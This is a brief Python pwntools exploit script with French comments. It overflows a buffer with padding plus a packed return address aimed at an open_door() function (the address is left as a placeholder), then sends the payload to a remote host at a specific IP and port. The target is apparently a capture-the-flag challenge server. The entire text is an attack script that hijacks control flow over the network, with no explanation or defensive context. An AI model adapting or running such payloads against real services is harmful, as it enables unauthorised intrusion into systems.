from pwn import *

# Adresses des fonctions
open_door_address = 0x12345678  # Remplacez par l'adresse de la fonction open_door() sur le serveur distant

# Création du payload
padding = b'A' * 24  # Ajustez la taille du padding en fonction de la taille du buffer
payload = padding + p64(open_door_address)  # Utilisez p32 ou p64 en fonction de votre architecture

# Connexion au serveur distant
conn = remote('94.237.60.112', 33462)

# Envoi du payload au serveur distant
conn.sendline(payload)

# Réception de la réponse du serveur
print(conn.recvuntil(b'!'))

# Fermeture de la connexion
conn.close()
